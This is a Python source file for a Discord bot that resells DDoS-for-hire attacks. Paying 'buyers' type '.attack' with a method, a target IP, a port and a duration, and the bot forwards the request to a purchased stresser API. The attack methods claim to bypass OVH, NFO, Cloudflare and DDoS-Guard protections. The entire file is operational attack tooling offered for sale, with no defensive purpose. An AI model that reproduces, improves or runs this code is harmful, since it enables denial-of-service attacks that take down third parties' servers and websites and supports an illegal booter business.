from discord.ext import commands
from discord.ext.commands import Bot
from os import system 
from os import name
import discord                       
import aiohttp                       # For Api
import random                      

buyers  = [1]  # EDIT IT (Discord User ID)
admins  = [1]  # EDIT IT (Discord User ID)
owners  = [1]  # EDIT IT (Discord User ID)
token   = 'enter_your_bot_token' # EDIT IT (Bot Token)
bot     = commands.Bot(command_prefix='.')

l4methods = ['TCP-BYPASS', 'UDP-BYPASS', 'OVH-KILL', 'NFO-KILL']
l7methods = ['HTTP-RAPE', 'HTTP-FLOOD', 'CF-BYPASS', 'DDOS-GUARD']
__api = [
    {
        'api_url':'https://stresserapi.com/', # EDIT IT (Get an api by purchasing any stresser plan)
        'api_key':'stresserapikey',      # EDIT IT (Get an api by purchasing any stresser plan)
        'max_boot_time':'1800'                  # EDIT IT (Get an api by purchasing any stresser plan)
    }
]
async def random_color():
    random_number = random.randint(1, 999999)

    while len(str(random_number)) != 6:
        random_number = int(str(f'{random.randint(1, 9)}{random_number}'))

    return random_number

@bot.command()
async def attack(ctx, method : str = None, hostip : str = None, port : str = None, time : str = None):
    if ctx.author.id not in buyers:
            await ctx.reply("You dont have access to use this command.", mention_author=False)

    else:
        if method is None or method.upper() == 'HELP':
            l4methodstr = ''
            l7methodstr = ''

            for m in l4methods:
                l4methodstr = f'{l4methodstr}{m}\n'

            for m2 in l7methods:
                l7methodstr = f'{l7methodstr}{m2}\n'

            embed = discord.Embed(title="Attack Help", description=" .attack <method> <ip> <port> <time>", color=await random_color())
            embed.add_field(name="Layer4 Methods: \n"f"{l4methodstr}", value= " DM Owners if you want to buy access.")
            embed.add_field(name="Layer7 Methods: \n"f"{l7methodstr}", value = " DM Owners if you want to buy access.")                  
            await ctx.reply(embed=embed, mention_author=False)

        elif method is None: # no method
            await ctx.reply("Enter a method for attack.", mention_author=False)
            
        elif method.upper() not in l4methods and method.upper() not in l7methods: # invalid method
            await ctx.reply("Enter a valid method for attack.", mention_author=False)

        elif hostip is None: # no ip
            await ctx.reply("Enter a target for attack.", mention_author=False)

        elif port is None: # no port
            await ctx.reply("Enter a port for attack.", mention_author=False)

        elif time is None: # no time
            await ctx.reply("Enter a time for attack.", mention_author=False)

        else: # correct format
            for i in __api:
                try:
                    api_url = i["api_url"]
                    api_key = i["api_key"]
                    max_boot_time = int(i["max_boot_time"])

                    if int(time) > max_boot_time:
                        time2 = max_boot_time
                        await ctx.reply(f'Max attack time for you is {max_boot_time} seconds, so attacking for {max_boot_time} seconds.', mention_author=False)

                    else:
                        time2 = int(time)

                    async with aiohttp.ClientSession() as session:
                        await session.post(f'{api_url}/?key={api_key}&host={hostip}&port={port}&time={time2}&method={method.upper()}')

                except Exception as e:
                    print(e)
                    pass
        if method.upper() in l7methods:
            await ctx.reply("Attacked to " f"{hostip} for {time2} seconds.", mention_author=False)
        elif method.upper() in l4methods:        
            await ctx.reply("Attacked to " f"{hostip}:{port} for {time2} seconds.", mention_author=False)
        else:
            await ctx.reply("huh?", mention_author=False)

@bot.command()
async def stop(ctx, method : str = None, hostip : str = None, port : str = None, time : str = None):
    if ctx.author.id not in owners:
            await ctx.reply("This command is available for Owners only.", mention_author=False)

    else:
        if method is None or method.upper() == 'HELP':
            l4methodstr = ''
            l7methodstr = ''

            for m in l4methods:
                l4methodstr = f'{l4methodstr}{m}\n'

            for m2 in l7methods:
                l7methodstr = f'{l7methodstr}{m2}\n'

            await ctx.reply("Usage: .stop <method> <ip> <port> <time>.", mention_author=False)


        elif method is None: # no method
            await ctx.reply("Enter a method for stop attack.", mention_author=False)
            
        elif method.upper() not in l4methods and method.upper() not in l7methods: # invalid method
            await ctx.reply("Enter a valid method for stop attack.", mention_author=False)

        elif hostip is None: # no ip
            await ctx.reply("Enter a target for stop attack.", mention_author=False)

        elif port is None: # no port
            await ctx.reply("Enter a port for stop attack.", mention_author=False)

        elif time is None: # no time
            await ctx.reply("Enter a time for stop attack.", mention_author=False)

        else: # correct format
            for i in __api:
                try:
                    api_url = i["api_url"]
                    api_key = i["api_key"]
                    max_boot_time = int(i["max_boot_time"])

                    if int(time) > max_boot_time:
                        time2 = max_boot_time

                    else:
                        time2 = int(time)

                    async with aiohttp.ClientSession() as session:
                        await session.post(f'{api_url}/?key={api_key}&host={hostip}&port={port}&time={time2}&method=STOP') # this may be wrong but most stressers use STOP method for stop attacks.
                
                except Exception as e:
                    print(e)
                    pass
        if method.upper() in l7methods:
            await ctx.reply("Stopped attack for " f"{hostip}", mention_author=False)
        elif method.upper() in l4methods:        
            await ctx.reply("Stopped attack for " f"{hostip}:{port}.", mention_author=False)
        else:
            await ctx.reply("huh?", mention_author=False)
@bot.event
async def on_ready():
    if name == 'nt':
        system('cls')

    else:
        system('clear')

    print(f'Logged in on {bot.user.name}. github.com/zKaan\n')
    
    if str(len(bot.guilds)) == 1:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} server!"))
        
    else:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} servers!"))

if __name__ == '__main__':
    bot.run(token)
